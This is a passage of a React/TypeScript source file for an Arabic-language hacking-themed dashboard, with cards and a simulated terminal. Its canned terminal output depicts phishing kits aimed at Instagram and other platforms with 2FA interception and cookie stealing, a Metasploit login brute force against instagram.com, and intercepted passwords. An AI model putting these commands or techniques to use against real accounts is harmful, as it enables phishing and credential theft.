      <AnimatePresence>
        {expanded && (
          <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }}>
            <div className="p-4 pt-0 space-y-3">
              <div className="text-[9px] font-mono text-gray-500 mb-2 tracking-wider">FEATURE MODULES ({fw.features.length})</div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                {fw.features.map((feat, i) => {
                  const Icon = feat.icon;
                  return (
                    <motion.div key={i} initial={{ x: -15, opacity: 0 }} animate={{ x: 0, opacity: 1 }} transition={{ delay: i * 0.05 }}
                      className="flex items-start gap-2 p-2.5 rounded-xl"
                      style={{ background: fw.color + "08", border: `1px solid ${fw.color}1a` }}>
                      <div className="w-7 h-7 rounded-lg flex items-center justify-center flex-shrink-0" style={{ background: fw.color + "20" }}>
                        <Icon size={12} style={{ color: fw.color }} />
                      </div>
                      <div>
                        <div className="text-[10px] font-bold font-mono text-white">{feat.name}</div>
                        {"sub" in feat && <div className="text-[8px] font-mono" style={{ color: fw.color }}>{(feat as {sub:string}).sub}</div>}
                        <div className="text-[9px] text-gray-400 font-mono leading-snug">{feat.detail}</div>
                      </div>
                    </motion.div>
                  );
                })}
              </div>
              <div className="rounded-xl overflow-hidden border" style={{ borderColor: fw.color + "25" }}>
                <div className="flex items-center justify-between px-3 py-1.5" style={{ background: fw.color + "12" }}>
                  <span className="text-[9px] font-mono" style={{ color: fw.color }}>SIMULATION — {fw.name}</span>
                  <button onClick={simulate} disabled={running} className="flex items-center gap-1 px-2 py-0.5 rounded text-[9px] font-mono font-bold transition-all"
                    style={{ background: running ? "#ffffff08" : fw.color + "28", color: fw.color, border: `1px solid ${fw.color}35` }}>
                    {running ? <><RefreshCw size={9} className="animate-spin" /> جارٍ...</> : <><Play size={9} /> تشغيل</>}
                  </button>
                </div>
                <div className="p-3 min-h-[70px] font-mono text-[10px] leading-5" style={{ background: "#040408", fontFamily: "'Courier New', monospace" }}>
                  {log.length === 0 && !running && <span className="text-gray-600">// اضغط تشغيل للمحاكاة...</span>}
                  {log.map((line, i) => (
                    <motion.div key={i} initial={{ x: -8, opacity: 0 }} animate={{ x: 0, opacity: 1 }}>
                      <span style={{ color: line.startsWith("[+]") ? "#10b981" : line.startsWith("[!]") ? "#f59e0b" : line.startsWith("[✓]") ? fw.color : "#6b7280" }}>{line}</span>
                    </motion.div>
                  ))}
                  {running && <span className="text-gray-500 animate-pulse">█</span>}
                </div>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
}

// ─── OSINT CARD ───────────────────────────────────────────────────────────────
function OsintCard({ tool }: { tool: typeof OSINT_TOOLS[0] }) {
  const [scan, setScan] = useState(false);
  const [progress, setProgress] = useState(0);
  const [findings, setFindings] = useState<string[]>([]);
  const [expanded, setExpanded] = useState(false);

  const runScan = useCallback(async () => {
    setScan(true); setProgress(0); setFindings([]);
    const steps = [
      `🔍 تهيئة ${tool.name}...`,
      `📡 الاتصال بمصادر البيانات...`,
      `🔄 جارٍ المسح والجمع...`,
      `📊 تحليل البيانات المجمعة...`,
      `🌐 التحقق المتقاطع من المصادر...`,
      `📍 استخراج البيانات الجغرافية...`,
      `🔗 ربط الكيانات والعلاقات...`,
      `✅ اكتمل التقرير — ${Math.floor(30 + Math.random() * 40)} نقطة بيانات`,
    ];
    for (let i = 0; i < steps.length; i++) {
      await new Promise(r => setTimeout(r, 450 + Math.random() * 350));
      setProgress(Math.round(((i + 1) / steps.length) * 100));
      setFindings(p => [...p, steps[i]]);
    }
    setScan(false);
  }, [tool.name]);

  return (
    <div className="rounded-[18px] border overflow-hidden" style={{ width: "clamp(340px, 40vw, 560px)", backdropFilter: "blur(40px)", borderColor: tool.color + "30", background: "rgba(0,0,0,0.78)" }}>
      <div className="p-4 cursor-pointer" onClick={() => setExpanded(!expanded)}
        style={{ background: `linear-gradient(135deg, ${tool.color}0a 0%, transparent 60%)` }}>
        <div className="flex items-center justify-between mb-2">
          <div className="flex items-center gap-2">
            <div className="w-9 h-9 rounded-xl flex items-center justify-center text-lg font-bold"
              style={{ background: tool.color + "18", border: `1px solid ${tool.color}35`, color: tool.color }}>
              {tool.icon}
            </div>
            <div>
              <div className="font-bold text-white text-sm font-mono">{tool.name}</div>
              <div className="flex items-center gap-1">
                <span className="text-[9px] font-mono" style={{ color: tool.color }}>{tool.category}</span>
                <span className="text-[8px] text-gray-600 font-mono">· {tool.vendor}</span>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-[8px] font-bold px-1.5 py-0.5 rounded-full font-mono"
              style={{ background: SEV_COLOR[tool.threat] + "20", color: SEV_COLOR[tool.threat] }}>{tool.threat}</span>
            <motion.div animate={{ rotate: expanded ? 90 : 0 }}><ChevronRight size={13} style={{ color: tool.color }} /></motion.div>
          </div>
        </div>
        <p className="text-[10px] text-gray-400 font-mono leading-relaxed">{tool.desc}</p>
      </div>

      <AnimatePresence>
        {expanded && (
          <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
            <div className="px-4 pb-4 space-y-3">
              <div className="grid grid-cols-1 gap-1.5">
                {tool.capabilities.map((cap, i) => {
                  const RawIcon = "icon" in cap ? (cap as {icon: React.ElementType; name: string; detail: string}).icon : Eye;
                  const IconEl = RawIcon as React.FC<{size?: number; style?: React.CSSProperties}>;
                  const name = "name" in cap ? (cap as {name: string}).name : "";
                  const detail = "detail" in cap ? (cap as {detail: string}).detail : String(cap);
                  return (
                    <motion.div key={i} initial={{ x: -12, opacity: 0 }} animate={{ x: 0, opacity: 1 }} transition={{ delay: i * 0.04 }}
                      className="flex items-start gap-2 w-7 h-7 flex items-center justify-center rounded-lg"
                      style={{ background: tool.color + "07", border: `1px solid ${tool.color}15` }}>
                      <div className="w-6 h-6 rounded-md flex items-center justify-center flex-shrink-0" style={{ background: tool.color + "18" }}>
                        <IconEl size={11} style={{ color: tool.color }} />
                      </div>
                      <div>
                        {name && <div className="text-[9px] font-bold font-mono text-white">{name}</div>}
                        <div className="text-[9px] text-gray-400 font-mono leading-snug">{detail}</div>
                      </div>
                    </motion.div>
                  );
                })}
              </div>
              {"versions" in tool && (
                <div className="flex flex-wrap gap-1">
                  {(tool.versions as string[]).map(v => (
                    <span key={v} className="text-[8px] font-mono px-1.5 py-0.5 rounded"
                      style={{ background: tool.color + "15", color: tool.color, border: `1px solid ${tool.color}25` }}>{v}</span>
                  ))}
                </div>
              )}
              {/* Scan */}
              {(scan || findings.length > 0) && (
                <div className="space-y-1">
                  <div className="flex justify-between text-[9px] font-mono">
                    <span style={{ color: tool.color }}>OSINT SCAN</span>
                    <span style={{ color: tool.color }}>{progress}%</span>
                  </div>
                  <div className="h-1 rounded-full bg-white/5">
                    <motion.div animate={{ width: `${progress}%` }} className="h-full rounded-full"
                      style={{ background: tool.color, boxShadow: `0 0 6px ${tool.color}80` }} />
                  </div>
                  <div className="max-h-24 overflow-y-auto space-y-0.5 text-[9px] font-mono">
                    {findings.map((f, i) => <div key={i} className="text-gray-400">{f}</div>)}
                  </div>
                </div>
              )}
              <button onClick={runScan} disabled={scan}
                className="w-full py-1.5 rounded-xl text-[10px] font-mono font-bold transition-all"
                style={{ background: scan ? "#ffffff08" : tool.color + "1f", color: tool.color, border: `1px solid ${tool.color}30` }}>
                {scan ? "⟳ جارٍ الفحص..." : `⟳ تشغيل ${tool.name}`}
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {!expanded && (
        <div className="px-4 pb-3">
          <button onClick={() => setExpanded(true)} className="w-full py-1 rounded-lg text-[9px] font-mono text-gray-600 hover:text-gray-400 transition-colors border border-white/5 hover:border-white/10">
            عرض التفاصيل الكاملة ▾
          </button>
        </div>
      )}
    </div>
  );
}

// ─── ATTACK VECTOR CARD ───────────────────────────────────────────────────────
function AttackVectorCard({ av }: { av: typeof ATTACK_VECTORS[0] }) {
  const Icon = av.icon;
  const [open, setOpen] = useState(false);
  return (
    <motion.div layout className="rounded-xl border overflow-hidden cursor-pointer"
      style={{ borderColor: av.color + "30", background: "rgba(0,0,0,0.75)" }}
      onClick={() => setOpen(!open)} whileHover={{ scale: 1.005 }}>
      <div className="p-3" style={{ background: `linear-gradient(135deg, ${av.color}0d, transparent 60%)` }}>
        <div className="flex items-center gap-2 mb-1.5">
          <div className="w-8 h-8 rounded-lg flex items-center justify-center"
            style={{ background: av.color + "20", border: `1px solid ${av.color}35` }}>
            <Icon size={14} style={{ color: av.color }} />
          </div>
          <div className="flex-1 min-w-0">
            <div className="font-bold text-white text-[11px] font-mono">{av.name}</div>
            <div className="text-[9px] text-gray-500 font-mono">{av.english}</div>
          </div>
          <span className="text-[8px] font-bold px-1.5 py-0.5 rounded-full font-mono flex-shrink-0"
            style={{ background: SEV_COLOR[av.severity] + "20", color: SEV_COLOR[av.severity] }}>{av.severity}</span>
        </div>
        <p className="text-[10px] text-gray-400 font-mono leading-snug">{av.desc}</p>
      </div>
      <AnimatePresence>
        {open && (
          <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
            <div className="p-3 pt-0 space-y-2.5">
              <div>
                <div className="text-[8px] font-mono text-gray-600 mb-1.5 tracking-wider">ATTACK SUBTYPES</div>
                <div className="space-y-1">
                  {av.subtypes.map((s, i) => (
                    <div key={i} className="flex items-start gap-1.5">
                      <span className="text-[9px] font-mono mt-0.5" style={{ color: av.color }}>▸</span>
                      <div>
                        <span className="text-[9px] font-mono font-bold text-white">{typeof s === 'string' ? s : s.name}</span>
                        {typeof s !== 'string' && <span className="text-[8px] text-gray-500 font-mono ml-1">— {s.desc}</span>}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
              {"technical" in av && (av.technical as string[]).length > 0 && (
                <div>
                  <div className="text-[8px] font-mono text-gray-600 mb-1.5 tracking-wider">TECHNICAL DETAILS</div>
                  <div className="rounded-lg p-2 space-y-0.5" style={{ background: "#08090f" }}>
                    {(av.technical as string[]).map((t, i) => (
                      <div key={i} className="text-[9px] font-mono text-gray-400" style={{ fontFamily: "'Courier New', monospace" }}>
                        <span style={{ color: av.color }}>$</span> {t}
                      </div>
                    ))}
                  </div>
                </div>
              )}
              <div>
                <div className="text-[8px] font-mono text-gray-600 mb-1 tracking-wider">TOOLS</div>
                <div className="flex flex-wrap gap-1">
                  {av.tools.map(t => <span key={t} className="text-[8px] font-mono px-1.5 py-0.5 rounded bg-white/5 text-gray-300">{t}</span>)}
                </div>
              </div>
              <div className="flex items-start gap-1.5 w-7 h-7 flex items-center justify-center rounded-lg" style={{ background: "#10b98115", border: "1px solid #10b98125" }}>
                <Shield size={10} className="text-emerald-400 mt-0.5 flex-shrink-0" />
                <span className="text-[9px] font-mono text-emerald-400">{av.defense}</span>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
}

// ─── CREDENTIAL TECHNIQUE CARD ────────────────────────────────────────────────
function CredentialCard({ tech }: { tech: typeof CREDENTIAL_TECHNIQUES[0] }) {
  const Icon = tech.icon;
  const [open, setOpen] = useState(false);
  return (
    <div className="rounded-[18px] border overflow-hidden" style={{ width: "clamp(340px, 40vw, 560px)", backdropFilter: "blur(40px)", borderColor: tech.color + "30", background: "rgba(0,0,0,0.78)" }}>
      <div className="p-4 cursor-pointer" onClick={() => setOpen(!open)}
        style={{ background: `linear-gradient(135deg, ${tech.color}0d, transparent 60%)` }}>
        <div className="flex items-center justify-between mb-2">
          <div className="flex items-center gap-2">
            <div className="w-9 h-9 rounded-xl flex items-center justify-center"
              style={{ background: tech.color + "20", border: `1px solid ${tech.color}35` }}>
              <Icon size={15} style={{ color: tech.color }} />
            </div>
            <div>
              <div className="font-bold text-white text-sm font-mono">{tech.name}</div>
              <span className="text-[8px] font-bold px-1.5 py-0.5 rounded-full font-mono"
                style={{ background: SEV_COLOR[tech.risk] + "20", color: SEV_COLOR[tech.risk] }}>{tech.risk}</span>
            </div>
          </div>
          <motion.div animate={{ rotate: open ? 90 : 0 }}><ChevronRight size={14} style={{ color: tech.color }} /></motion.div>
        </div>
        <p className="text-[10px] text-gray-400 font-mono">{tech.desc}</p>
      </div>
      <AnimatePresence>
        {open && (
          <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
            <div className="px-4 pb-4 space-y-3">
              <div>
                <div className="text-[8px] font-mono text-gray-600 mb-2 tracking-wider">ATTACK STEPS</div>
                <div className="space-y-1.5">
                  {tech.steps.map((step, i) => (
                    <motion.div key={i} initial={{ x: -10, opacity: 0 }} animate={{ x: 0, opacity: 1 }} transition={{ delay: i * 0.06 }}
                      className="flex items-start gap-2">
                      <div className="w-4 h-4 rounded flex items-center justify-center text-[7px] font-bold flex-shrink-0"
                        style={{ background: tech.color + "25", color: tech.color }}>{i + 1}</div>
                      <span className="text-[9px] font-mono text-gray-300">{step.replace(/^\d+\. /, '')}</span>
                    </motion.div>
                  ))}
                </div>
              </div>
              <div>
                <div className="text-[8px] font-mono text-gray-600 mb-1 tracking-wider">BYPASS TECHNIQUES</div>
                <div className="flex flex-wrap gap-1">
                  {tech.bypass.map(b => (
                    <span key={b} className="text-[8px] font-mono px-1.5 py-0.5 rounded"
                      style={{ background: tech.color + "15", color: tech.color, border: `1px solid ${tech.color}25` }}>{b}</span>
                  ))}
                </div>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// ─── SUPPORT TOOL CARD ────────────────────────────────────────────────────────
function SupportToolCard({ tool }: { tool: typeof SUPPORT_TOOLS[0] }) {
  const Icon = tool.icon;
  const [open, setOpen] = useState(false);
  return (
    <div className="rounded-[18px] border overflow-hidden" style={{ width: "clamp(340px, 40vw, 560px)", backdropFilter: "blur(40px)", borderColor: tool.color + "30", background: "rgba(0,0,0,0.78)" }}>
      <div className="p-4 cursor-pointer" onClick={() => setOpen(!open)}
        style={{ background: `linear-gradient(135deg, ${tool.color}0a, transparent 60%)` }}>
        <div className="flex items-center gap-3 mb-2">
          <div className="w-9 h-9 rounded-xl flex items-center justify-center"
            style={{ background: tool.color + "20", border: `1px solid ${tool.color}40` }}>
            <Icon size={16} style={{ color: tool.color }} />
          </div>
          <div className="flex-1">
            <div className="font-bold text-white text-sm font-mono">{tool.name}</div>
            <div className="flex items-center gap-1">
              <span className="text-[9px] font-mono" style={{ color: tool.color }}>{tool.category}</span>
              <span className="text-[8px] text-gray-600">· {tool.vendor}</span>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-[8px] font-bold px-1.5 py-0.5 rounded-full font-mono"
              style={{ background: SEV_COLOR[tool.threat] + "20", color: SEV_COLOR[tool.threat] }}>{tool.threat}</span>
            <motion.div animate={{ rotate: open ? 90 : 0 }}><ChevronRight size={13} style={{ color: tool.color }} /></motion.div>
          </div>
        </div>
        <p className="text-[10px] text-gray-400 font-mono leading-relaxed">{tool.desc}</p>
      </div>
      <AnimatePresence>
        {open && (
          <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
            <div className="px-4 pb-4 grid grid-cols-1 md:grid-cols-2 gap-1.5">
              {tool.features.map((f, i) => (
                <motion.div key={i} initial={{ x: -10, opacity: 0 }} animate={{ x: 0, opacity: 1 }} transition={{ delay: i * 0.05 }}
                  className="flex items-start gap-1.5 w-7 h-7 flex items-center justify-center rounded-lg"
                  style={{ background: tool.color + "07", border: `1px solid ${tool.color}15` }}>
                  <div className="w-1.5 h-1.5 rounded-full mt-1.5 flex-shrink-0" style={{ background: tool.color, boxShadow: `0 0 5px ${tool.color}` }} />
                  <div>
                    <div className="text-[9px] font-bold font-mono text-white">{f.name}</div>
                    <div className="text-[8px] text-gray-500 font-mono">{f.detail}</div>
                  </div>
                </motion.div>
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// ─── HACK TERMINAL ────────────────────────────────────────────────────────────
const TERMINAL_CMDS: Record<string, Array<{ text: string; color: string }>> = {
  help: [
    { text: "╔═══════════ أوامر محطة الاختراق ═══════════╗", color: "#e21227" },
    { text: "║ أطر الهندسة الاجتماعية:", color: "#a855f7" },
    { text: "  set          — Social Engineer Toolkit", color: "#a855f7" },
    { text: "  socialfish   — SocialFish v3 (2FA bypass)", color: "#a855f7" },
    { text: "  gophish      — GoPhish Campaign Manager", color: "#a855f7" },
    { text: "  modlishka    — Reverse Proxy Phishing", color: "#a855f7" },
    { text: "  evilginx     — Evilginx3 MitM Framework", color: "#a855f7" },
    { text: "║ أدوات OSINT:", color: "#00e5ff" },
    { text: "  sherlock     — Username Hunt (400+ sites)", color: "#00e5ff" },
    { text: "  maltego      — Graph Intelligence", color: "#00e5ff" },
    { text: "  spiderfoot   — Auto OSINT Platform", color: "#00e5ff" },
    { text: "  osintgram    — Instagram Intelligence", color: "#00e5ff" },
    { text: "  whatsmyname  — Username Enumeration", color: "#00e5ff" },
    { text: "  exiftool     — EXIF Metadata Extractor", color: "#00e5ff" },
    { text: "  metagoofil   — Document Metadata Scraper", color: "#00e5ff" },
    { text: "  theharvester — Email & Domain OSINT", color: "#00e5ff" },
    { text: "║ الأدوات الداعمة:", color: "#10b981" },
    { text: "  burp         — Burp Suite Professional", color: "#10b981" },
    { text: "  metasploit   — Exploitation Framework", color: "#10b981" },
    { text: "  shodan       — Internet Device Search", color: "#10b981" },
    { text: "  wireshark    — Network Packet Analyzer", color: "#10b981" },
    { text: "  ettercap     — MitM Attack Suite", color: "#10b981" },
    { text: "  pydictor     — Wordlist Generator", color: "#10b981" },
    { text: "  recon-ng     — Web Recon Framework", color: "#10b981" },
    { text: "║ التقنيات:", color: "#f59e0b" },
    { text: "  tabnabbing   — Browser Tab Attack", color: "#f59e0b" },
    { text: "  googletrans  — Google Translate Bypass", color: "#f59e0b" },
    { text: "  emailspoof   — Email Sender Spoofing", color: "#f59e0b" },
    { text: "  2fabypass    — MFA Interception", color: "#f59e0b" },
    { text: "  simswap      — SIM Swapping Attack", color: "#f59e0b" },
    { text: "  credstuff    — Credential Stuffing", color: "#f59e0b" },
    { text: "║ أدوات عامة:", color: "#6b7280" },
    { text: "  clear         — مسح الشاشة", color: "#6b7280" },
    { text: "╚══════════════════════════════════════════╝", color: "#e21227" },
  ],
  set: [
    { text: "[*] Social Engineer Toolkit (SET) v8.0.3", color: "#a855f7" },
    { text: "[*] By: Dave Kennedy (TrustedSec)", color: "#6b7280" },
    { text: "[+] تهيئة مكتبات الهجوم...", color: "#a855f7" },
    { text: "[+] وحدة Website Attack — مُحمَّلة", color: "#10b981" },
    { text: "[+] وحدة Spear-Phishing — مُحمَّلة", color: "#10b981" },
    { text: "[+] وحدة Credential Harvester — مُحمَّلة", color: "#10b981" },
    { text: "[+] وحدة Tabnabbing — مُحمَّلة", color: "#10b981" },
    { text: "[+] وحدة Mass Mailer — مُحمَّلة", color: "#10b981" },
    { text: "[+] وحدة QRCode Attack — مُحمَّلة", color: "#10b981" },
    { text: "[+] وحدة PowerShell — مُحمَّلة", color: "#10b981" },
    { text: "[+] Metasploit Framework — متصل", color: "#10b981" },
    { text: "[*] اختر وجهتك:", color: "#f59e0b" },
    { text: "  1) Social-Engineering Attacks", color: "#6b7280" },
    { text: "  2) Penetration Testing (Fast-Track)", color: "#6b7280" },
    { text: "  3) Third Party Modules", color: "#6b7280" },
    { text: "  4) Update the Social-Engineer Toolkit", color: "#6b7280" },
    { text: "  99) Exit the Social-Engineer Toolkit", color: "#6b7280" },
    { text: "[✓] SET جاهز — 15 منصة اجتماعية محملة", color: "#a855f7" },
  ],
  socialfish: [
    { text: "[*] SocialFish v3.0.0 — Advanced Phishing Platform", color: "#e21227" },
    { text: "[+] لوحة التحكم الحية — تشغيل على :3333", color: "#10b981" },
    { text: "[+] ngrok Tunnel — نشط", color: "#10b981" },
    { text: "[+] Telegram Bot — متصل للإشعارات", color: "#10b981" },
    { text: "[+] 2FA Interceptor — جاهز (OTP mode: TOTP/SMS)", color: "#e21227" },
    { text: "[*] القوالب المتاحة:", color: "#6b7280" },
    { text: "  [1] Facebook     [2] Instagram    [3] Twitter/X", color: "#6b7280" },
    { text: "  [4] TikTok       [5] Snapchat     [6] LinkedIn", color: "#6b7280" },
    { text: "  [7] WhatsApp     [8] Telegram     [9] Discord", color: "#6b7280" },
    { text: "  [10] Pinterest   [11] Gmail       [12] Outlook", color: "#6b7280" },
    { text: "[+] Template محدد: Instagram Login v2024", color: "#a855f7" },
    { text: "[!] Phishing URL: https://ig-login.ngrok-free.app", color: "#f59e0b" },
    { text: "[*] انتظار الضحايا... (Cookie Stealer: ENABLED)", color: "#6b7280" },
  ],
  sherlock: [
    { text: "[*] Sherlock v0.15.0 — Find Social Media Profiles", color: "#f59e0b" },
    { text: "[*] جارٍ البحث عبر 400+ منصة...", color: "#6b7280" },
    { text: "[+] twitter.com/target        [200] ✓ موجود", color: "#10b981" },
    { text: "[+] instagram.com/target      [200] ✓ موجود", color: "#10b981" },
    { text: "[+] github.com/target         [200] ✓ موجود", color: "#10b981" },
    { text: "[+] reddit.com/u/target       [200] ✓ موجود", color: "#10b981" },
    { text: "[+] linkedin.com/in/target    [200] ✓ موجود", color: "#10b981" },
    { text: "[+] tiktok.com/@target        [200] ✓ موجود", color: "#10b981" },
    { text: "[+] twitch.tv/target          [200] ✓ موجود", color: "#10b981" },
    { text: "[-] facebook.com/target       [404] ✗ غير موجود", color: "#6b7280" },
    { text: "[+] pinterest.com/target      [200] ✓ موجود", color: "#10b981" },
    { text: "[+] deviantart.com/target     [200] ✓ موجود", color: "#10b981" },
    { text: "[✓] اكتمل: 9/10 منصات — النتائج في: target.txt", color: "#f59e0b" },
  ],
  maltego: [
    { text: "[*] Maltego v4.6 — Graph Intelligence Engine", color: "#00e5ff" },
    { text: "[+] SOCMINT Collection — بدء الجمع...", color: "#6b7280" },
    { text: "[+] 23 شخص مرتبط بالهدف مباشرة", color: "#00e5ff" },
    { text: "[+] 7 نطاق مرتبط: target.com, target.net...", color: "#00e5ff" },
    { text: "[+] 15 عنوان IP مكتشف", color: "#00e5ff" },
    { text: "[+] 11 بريد إلكتروني مستخرج", color: "#10b981" },
    { text: "[+] 4 أرقام هاتف متعلقة", color: "#10b981" },
    { text: "[+] Social Links Pro: 3 حسابات Dark Web", color: "#f97316" },
    { text: "[+] تحليل Sock Puppet: 2 حساب وهمي مشبوه", color: "#f59e0b" },
    { text: "[✓] الرسم البياني: 67 عقدة · 143 رابط مكتشف", color: "#10b981" },
  ],
  spiderfoot: [
    { text: "[*] SpiderFoot v4.0 — Automated OSINT Platform", color: "#10b981" },
    { text: "[*] تشغيل 200+ وحدة بحث تلقائي...", color: "#6b7280" },
    { text: "[+] DNS Records       ✓ — 12 سجل", color: "#10b981" },
    { text: "[+] WHOIS Data        ✓ — تفاصيل المالك", color: "#10b981" },
    { text: "[+] SSL Certificates  ✓ — 8 شهادة", color: "#10b981" },
    { text: "[+] Social Profiles   ✓ — 9 حساب", color: "#10b981" },
    { text: "[!] Breach Data       ✓ — 3 تسريبات مكتشفة", color: "#f97316" },
    { text: "[!] Shodan Results    ✓ — 5 أجهزة مكشوفة", color: "#f59e0b" },
    { text: "[!] CVE Matches       ✓ — CVE-2024-1234 (CRITICAL)", color: "#e21227" },
    { text: "[✓] سطح الهجوم: MEDIUM RISK — التقرير جاهز", color: "#10b981" },
  ],
  whatsmyname: [
    { text: "[*] WhatsMyName — Username Enumeration Tool", color: "#8b5cf6" },
    { text: "[*] فحص 500+ موقع للمستخدم: target_user", color: "#6b7280" },
    { text: "[+] Twitch          ✓ — HTTP 200", color: "#10b981" },
    { text: "[+] Steam           ✓ — Profile Found", color: "#10b981" },
    { text: "[+] Roblox          ✓ — User Exists", color: "#10b981" },
    { text: "[+] Soundcloud      ✓ — Public Profile", color: "#10b981" },
    { text: "[+] Spotify         ✓ — Found", color: "#10b981" },
    { text: "[-] OnlyFans        ✗ — Not Found (404)", color: "#6b7280" },
    { text: "[+] VK.com          ✓ — Russian SNS", color: "#10b981" },
    { text: "[+] Keybase         ✓ — With PGP Key", color: "#10b981" },
    { text: "[✓] 14/16 منصات — نتائج جاهزة للـ Maltego", color: "#8b5cf6" },
  ],
  exiftool: [
    { text: "[*] ExifTool v12.96 — Metadata Intelligence", color: "#f97316" },
    { text: "[*] تحليل: photo_2024.jpg", color: "#6b7280" },
    { text: "GPS Latitude                    : 24 deg 41' 23.94\" N", color: "#f97316" },
    { text: "GPS Longitude                   : 46 deg 41' 38.24\" E", color: "#f97316" },
    { text: "GPS Position                    : 24.6899833 N, 46.6939556 E", color: "#e21227" },
    { text: "Make                            : Apple", color: "#10b981" },
    { text: "Camera Model Name               : iPhone 15 Pro", color: "#10b981" },
    { text: "Software                        : 17.2.1", color: "#10b981" },
    { text: "Create Date                     : 2024:06:15 14:23:07", color: "#f59e0b" },
    { text: "GPS Altitude                    : 612.7 m Above Sea Level", color: "#f97316" },
    { text: "[!] الموقع الدقيق: الرياض، المملكة العربية السعودية", color: "#e21227" },
    { text: "[✓] بيانات EXIF كاملة — راجع Google Maps!", color: "#f97316" },
  ],
  metagoofil: [
    { text: "[*] Metagoofil v2.2 — Document Metadata Scraper", color: "#22d3ee" },
    { text: "[*] هدف: target-company.com", color: "#6b7280" },
    { text: "[+] Google Dork: site:target-company.com filetype:pdf", color: "#22d3ee" },
    { text: "[+] اكتُشف 23 ملف PDF, 11 DOCX, 8 XLSX", color: "#10b981" },
    { text: "[+] أسماء المستخدمين المكتشفة:", color: "#f59e0b" },
    { text: "    john.doe | ahmed.ali | sarah.admin | IT-admin", color: "#f97316" },
    { text: "[+] مسارات الشبكة الداخلية:", color: "#f59e0b" },
    { text: "    \\\\FILESERVER01\\HR\\Documents\\", color: "#f97316" },
    { text: "[+] إصدارات البرامج: MS Office 2019, Acrobat DC 23.x", color: "#22d3ee" },
    { text: "[✓] تقرير metagoofil.html جاهز للمراجعة", color: "#22d3ee" },
  ],
  burp: [
    { text: "[*] Burp Suite Professional v2024.3.1.3", color: "#f97316" },
    { text: "[+] Proxy: 127.0.0.1:8080 — نشط", color: "#10b981" },
    { text: "[+] CA Certificate — مثبت في المتصفح", color: "#10b981" },
    { text: "[+] Active Scanner — جاهز", color: "#10b981" },
    { text: "[+] Collaborator Server — متصل", color: "#10b981" },
    { text: "[*] اعتراض أول طلب:", color: "#6b7280" },
    { text: "POST /api/login HTTP/2", color: "#f97316" },
    { text: "Host: www.instagram.com", color: "#6b7280" },
    { text: '{\"username\":\"victim@mail.com\",\"password\":\"INTERCEPTED\"}', color: "#e21227" },
    { text: "[!] بيانات اعتماد محتجزة — إرسال للـ Repeater؟", color: "#f59e0b" },
    { text: "[✓] Burp Suite جاهز — ابدأ التصفح على الموقع الهدف", color: "#f97316" },
  ],
  metasploit: [
    { text: "       =[ metasploit v6.4.0-dev ]=", color: "#e21227" },
    { text: "+ -- --=[ 2352 exploits - 1231 auxiliary ]", color: "#e21227" },
    { text: "+ -- --=[ 592 payloads - 47 encoders ]", color: "#e21227" },
    { text: "", color: "#6b7280" },
    { text: "msf6 > use auxiliary/scanner/http/http_login", color: "#10b981" },
    { text: "msf6 auxiliary(http_login) > set RHOSTS instagram.com", color: "#6b7280" },
    { text: "msf6 auxiliary(http_login) > set USER_FILE users.txt", color: "#6b7280" },
    { text: "msf6 auxiliary(http_login) > set PASS_FILE wordlist.txt", color: "#6b7280" },
    { text: "msf6 auxiliary(http_login) > run", color: "#f59e0b" },
    { text: "[+] SUCCESS: admin@target.com : P@ssw0rd123!", color: "#10b981" },
    { text: "[*] Scanned 1 of 1 hosts (100% complete)", color: "#6b7280" },
    { text: "[✓] بيانات اعتماد صحيحة مكتشفة — جلسة مفتوحة!", color: "#e21227" },
  ],
  shodan: [
    { text: "[*] Shodan — The Search Engine for Internet-Connected Devices", color: "#00e5ff" },
    { text: "[*] استعلام: org:\"Meta Platforms\" country:US port:443", color: "#6b7280" },
    { text: "[+] النتائج: 1,847 جهاز مكشوف", color: "#10b981" },
    { text: "[!] 23 خادم يعمل بـ Nginx 1.18 (EOL - ثغرات متعددة)", color: "#f97316" },
    { text: "[!] CVE-2021-44228 (Log4Shell) — 3 أجهزة متأثرة", color: "#e21227" },
    { text: "[+] SSL Expiry: 7 شهادات تنتهي خلال 30 يوم", color: "#f59e0b" },
    { text: "[+] Favicon Hash: d41d8cd98f00b204 — 156 نتيجة", color: "#00e5ff" },
    { text: "[✓] تصدير JSON/CSV — تحليل مع SpiderFoot؟", color: "#00e5ff" },
  ],
  wireshark: [
    { text: "[*] Wireshark 4.2.5 — Network Protocol Analyzer", color: "#6366f1" },
    { text: "[*] التقاط على: wlan0 (Monitor Mode)", color: "#6b7280" },
    { text: "[+] 1,247 حزمة ملتقطة في 30 ثانية", color: "#10b981" },
    { text: "[!] HTTP POST اكتُشف (بدون HTTPS!):", color: "#f97316" },
    { text: "Frame 847: POST /login HTTP/1.1", color: "#6366f1" },
    { text: "username=victim%40email.com&password=MyPass123", color: "#e21227" },
    { text: "[!] Session Cookie مكتشف:", color: "#f59e0b" },
    { text: "Set-Cookie: sessionid=abc123xyz789; Domain=.target.com", color: "#e21227" },
    { text: "[✓] استخدم Follow→TCP Stream لعرض المحادثة كاملة", color: "#6366f1" },
  ],
  pydictor: [
    { text: "[*] Pydictor v3.0 — Intelligent Wordlist Generator", color: "#10b981" },
    { text: "[*] تحليل معلومات الهدف...", color: "#6b7280" },
    { text: "[+] اسم: أحمد علي → ahmed, ali, ahmedali", color: "#10b981" },
    { text: "[+] تاريخ الميلاد: 1995 → 95, 1995, _95", color: "#10b981" },
    { text: "[+] تطبيق LEET: ahmed → 4hm3d, ahm3d, 4hmed", color: "#10b981" },
